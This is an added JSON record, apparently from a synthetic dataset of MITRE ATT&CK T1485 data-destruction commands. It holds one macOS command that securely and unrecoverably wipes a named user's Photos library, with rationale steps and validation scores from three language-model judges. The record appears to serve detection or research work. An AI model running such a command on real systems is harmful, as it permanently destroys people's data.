@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1485",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "srm -rfm \"/Users/marketing/Pictures/Photos Library.photoslibrary\"",
+  "explanation": "Securely and recursively destroys the Photos library package for a specific user, preventing recovery of images.",
+  "rationale_steps": [
+    "Choose a single user's Photos library to avoid broader system damage.",
+    "Use -r for recursive deletion of the package's internal structure.",
+    "Use -m for multi-pass overwriting to ensure irrecoverability."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-45236c1a-ea3542f2",
+  "source_prompt_hash": "45236c1a",
+  "timestamp_utc": "2025-09-30T07:56:40.760169Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags (-rfm), proper quoting around the path, and correct syntax for the srm secure deletion utility.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by using srm (secure remove) with flags for recursive (-r), force (-f), and DoD-compliant overwriting (-m) to permanently destroy a photo library, making recovery impossible.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:03:51.085706Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with a recognized utility, valid flags, and proper quoting for the file path.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by using a secure deletion tool (`srm`) with appropriate flags to irrecoverably destroy data within a user's directory, which is plausible without elevated privileges.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:03:56.000962Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed command with valid srm flags (-r -f -m) and a properly quoted path.",
+        "semantic_score": 4,
+        "semantic_justification": "Uses srm to recursively and forcefully wipe the Photos library package, aligning with data destruction, but effectiveness and execution depend on user permissions and srm\u2019s availability/limitations on APFS/SSDs.",
+        "combined_score": 4.5,
+        "confidence": 0.78,
+        "timestamp": "2025-10-02T02:04:23.942989Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
